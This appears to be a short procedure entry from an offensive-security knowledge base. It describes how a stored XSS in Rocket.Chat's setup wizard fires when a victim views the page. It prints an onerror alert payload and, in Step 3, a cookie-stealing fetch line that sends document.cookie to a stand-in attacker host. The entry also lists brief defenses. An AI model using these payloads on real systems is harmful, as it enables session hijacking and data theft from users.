---
tags:
  - xss
  - execution
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:20.305Z'
skill_level: basic
impact_level: high
detection_risk: medium
sub_techniques: []
id: 8a1fa86b-26c1-48b2-9505-1c68fe7467c4
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-Stored-XSS-by-Viewing-Affected-Page

## Summary

This procedure triggers the execution of the stored malicious JavaScript by rendering the affected page in a victim's browser, leading to arbitrary code execution and potential compromise.

## Description

Once the payload is stored in Rocket.Chat's setup wizard data, any user viewing the wizard or pages displaying the tainted input (e.g., instance title) will have the JavaScript executed in their browser context. This can occur during normal navigation or shared views. The attack relies on the lack of output encoding, causing the browser to interpret the stored HTML/JS. Outcomes include immediate script runs like alerts or more severe actions such as cookie theft via `document.cookie`. Prerequisites: A victim accessing the vulnerable page post-injection.

## Requirements

1. Access to the affected Rocket.Chat page from a different browser session or user
2. Stored payload from prior injection
3. Standard web connectivity to the target

## Defense

Defensive measures and detection strategies:

- Encode outputs using HTML entity encoding (e.g., &lt; for <)
- Deploy Web Application Firewalls (WAF) to block XSS patterns
- Audit browser console for unexpected script errors or alerts

## Objectives

1. Execute injected JavaScript in the victim's browser
2. Achieve impacts like session hijacking or data exfiltration
3. Demonstrate persistence across user sessions

## Instructions

### Step 1: Simulate Victim Access

**Context**: Load the page containing the stored payload to initiate rendering.

In a new browser tab or incognito window (to simulate a different user), navigate to the Rocket.Chat setup wizard or dashboard showing the instance title.

### Step 2: Observe Execution

**Context**: The browser parses the stored input, triggering the malicious code.

Upon page load, the injected script executes automatically. For the example payload `<img src="x" onerror="alert('XSS')">`, an alert dialog should appear confirming execution.

> Screenshots from the vulnerability report show onerror prompts firing, validating the trigger.

### Step 3: Validate Impact

**Context**: Check for broader effects beyond the test alert.

Inspect browser developer tools (F12) for console logs or network requests initiated by the script. In a real attack, replace the alert with code to steal sessions (e.g., `fetch('http://attacker.com?cookie=' + document.cookie)`).

**Expected Output**: Script runs, e.g., alert pops or custom actions occur, with no server-side blocking.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- javascript
- execution
